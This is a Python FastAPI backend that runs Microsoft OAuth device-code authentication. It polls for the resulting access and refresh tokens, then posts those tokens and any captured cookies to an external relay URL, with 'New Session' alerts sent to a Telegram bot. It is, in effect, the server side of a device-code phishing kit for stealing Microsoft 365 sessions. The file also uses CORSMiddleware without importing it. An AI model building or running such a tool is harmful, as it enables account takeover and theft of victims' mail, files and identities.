from fastapi import FastAPI, HTTPException
import httpx
import asyncio
import os
import time
import json
import redis.asyncio as aioredis

app = FastAPI()

CLIENT_ID = os.getenv("MICROSOFT_CLIENT_ID")
TENANT_ID = os.getenv("MICROSOFT_TENANT_ID", "common")
RELAY_URL = os.getenv("RELAY_URL")
SCOPES = os.getenv("SCOPES", "https://graph.microsoft.com/.default offline_access openid profile").split()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT = os.getenv("TELEGRAM_CHAT_ID")
REDIS_URL = os.getenv("REDIS_URL")

redis_client = None
sessions = {}

app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.on_event("startup")
async def startup():
    global redis_client
    if not CLIENT_ID:
        print("ERROR: MICROSOFT_CLIENT_ID is missing")
    if REDIS_URL:
        redis_client = aioredis.from_url(REDIS_URL, decode_responses=True)
        print("Redis connected")
    print("Backend started")


async def get_session(dc):
    if redis_client:
        data = await redis_client.get(f"session:{dc}")
        return json.loads(data) if data else None
    return sessions.get(dc)


async def save_session(dc, data, ttl=1200):
    if redis_client:
        await redis_client.set(f"session:{dc}", json.dumps(data), ex=ttl)
    else:
        sessions[dc] = data


async def send_telegram(device_code, user_code, count):
    if not (TELEGRAM_TOKEN and TELEGRAM_CHAT):
        return
    try:
        msg = f"New Session\nDevice: {device_code[:12]}...\nCode: {user_code}\nCookies: {count}"
        async with httpx.AsyncClient() as c:
            await c.post(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", json={"chat_id": TELEGRAM_CHAT, "text": msg})
    except:
        pass


async def poll_token(device_code):
    session = await get_session(device_code)
    if not session: return
    start = time.time()
    interval = 5
    async with httpx.AsyncClient(timeout=30) as client:
        while time.time() - start < session.get("expires_in", 900) + 60:
            try:
                r = await client.post(
                    f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token",
                    data={"client_id": CLIENT_ID, "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "device_code": device_code},
                    headers={"Content-Type": "application/x-www-form-urlencoded"}
                )
                data = r.json()
                if r.status_code == 200:
                    session["status"] = "success"
                    session["token"] = data
                    count = len(session.get("cookies", {}))
                    payload = {"device_code": device_code, "user_code": session["user_code"], "token": data, "cookies": session.get("cookies", {}), "status": "success"}
                    if RELAY_URL:
                        try:
                            async with httpx.AsyncClient() as rc:
                                await rc.post(RELAY_URL, json=payload, timeout=10)
                        except:
                            pass
                    await send_telegram(device_code, session["user_code"], count)
                    await save_session(device_code, session)
                    break
                elif data.get("error") == "authorization_pending":
                    await asyncio.sleep(interval)
                elif data.get("error") == "slow_down":
                    interval += 5
                    await asyncio.sleep(interval)
                else:
                    session["status"] = "error"
                    await save_session(device_code, session)
                    break
            except:
                await asyncio.sleep(interval)


@app.post("/start-device-auth")
async def start_auth():
    if not CLIENT_ID:
        raise HTTPException(500, "MICROSOFT_CLIENT_ID is not set")
    async with httpx.AsyncClient() as c:
        r = await c.post(
            f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode",
            data={"client_id": CLIENT_ID, "scope": " ".join(SCOPES)},
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        if r.status_code != 200:
            raise HTTPException(400, "Failed to get device code")
        data = r.json()
        dc = data["device_code"]
        await save_session(dc, {"user_code": data["user_code"], "expires_in": data["expires_in"], "interval": 5, "status": "pending", "token": None, "cookies": {}})
        asyncio.create_task(poll_token(dc))
        return data


@app.get("/auth-status/{device_code}")
async def get_status(device_code: str):
    s = await get_session(device_code)
    if not s:
        raise HTTPException(404, "Session not found")
    return {"status": s["status"], "user_code": s["user_code"], "token": s.get("token"), "cookies": s.get("cookies")}


@app.get("/health")
async def health():
    return {"status": "healthy", "client_id_set": bool(CLIENT_ID)}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 8000)))
